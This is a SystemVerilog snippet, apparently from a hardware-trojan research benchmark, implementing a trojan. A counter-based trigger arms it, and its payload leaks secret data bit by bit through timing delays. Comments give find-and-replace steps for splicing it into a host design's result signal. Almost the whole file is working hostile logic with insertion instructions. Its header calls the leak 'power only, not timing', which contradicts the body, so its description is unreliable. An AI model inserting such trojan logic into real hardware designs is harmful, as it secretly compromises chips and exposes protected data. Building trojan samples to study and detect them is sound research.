/**
 * Sequential Covert Channel Trojan - Code Snippet
 * 
 * Trust-Hub Status: Related to Leak Information (power only, not timing)
 * Literature Sources: Kocher 1996, Lipp et al. 2021, Lin et al. 2009
 * 
 * Description:
 *   Creates timing-based covert channel
 *   
 * Trigger: Counter on regData.v_lhs_mant
 * Payload: Modulate timing of result based on secret data
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (regData.v_lhs_mant) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Timing Covert Channel
// ============================================================

// Timing modulation based on secret bit
logic [7:0] timing_delay;
logic secret_bit;

// Extract secret bit from payload signal (LSB)
assign secret_bit = result[0];

always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        timing_delay <= '0;
    end else if (trojan_active) begin
        // Long delay for bit '1', short for bit '0'
        timing_delay <= secret_bit ? 8'd255 : 8'd1;
    end else if (timing_delay > 0) begin
        timing_delay <= timing_delay - 1;
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Covert Channel: Modulate timing of result
//
// Integration Script Must Modify:
//
// IF result is timing-sensitive:
//   Find: assign result = ready_signal;
//   Replace: assign result = (timing_delay == 0) ? ready_signal : 1'b0;
//
// This creates observable timing variations:
//   - Bit '1': 255 cycle delay
//   - Bit '0': 1 cycle delay
//   - Timing difference reveals secret data bit-by-bit